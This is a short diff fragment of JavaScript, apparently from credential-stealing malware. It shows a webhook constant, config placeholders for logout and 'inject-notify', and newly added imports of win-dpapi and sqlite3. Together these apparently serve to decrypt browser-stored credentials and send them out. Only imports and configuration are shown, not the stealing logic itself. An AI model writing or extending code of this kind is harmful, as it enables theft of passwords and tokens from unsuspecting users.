@@ -8,7 +8,8 @@ var request = require('sync-request');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
 const webhook = "da_webhook"
-
+const dpapi = require("win-dpapi");
+const sqlite3 = require('sqlite3');
 const config = {
     "logout": "%LOGOUT%",
     "inject-notify": "%INJECTNOTI%",
